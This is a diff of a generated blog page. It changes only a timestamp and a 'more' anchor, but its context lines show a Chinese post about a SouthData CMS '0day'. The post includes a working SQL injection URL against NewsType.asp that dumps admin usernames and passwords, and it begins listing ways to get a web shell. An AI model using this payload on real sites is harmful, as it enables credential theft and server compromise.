@@ -27,7 +27,7 @@
 直接爆出用户密码，构造 URL 如下：
 1http://www.xxx.com/NewsType.asp?SmallClass=&amp;apos; union select 0,username+CHR(124)+pa">
 <meta property="og:image" content="http://p1.bqimg.com/567571/685d3bea31bea91d.jpg">
-<meta property="og:updated_time" content="2017-03-09T23:38:57.648Z">
+<meta property="og:updated_time" content="2017-03-09T23:45:23.126Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="沐小晨曦">
 <meta name="twitter:description" content="南方数据企业0day漏洞00x0 漏洞简述
@@ -182,6 +182,7 @@
 <p>直接爆出用户密码，构造 URL 如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.xxx.com/NewsType.asp?SmallClass=&apos; union select 0,username+CHR(124)+password,2,3,4,5,6,7,8,9 from admin union select * from news where 1=2 and &apos;&apos;=&apos;</div></pre></td></tr></table></figure>
 <p>拿 shell 方法貌似有三种：</p>
+<a id="more"></a>
 <ol>
 <li>注册用户上传拿 shell，这个比较直接，可以不进后台和在不知道用户名密码的情况下。</li>
 <li>进后台备份数据库。</li>
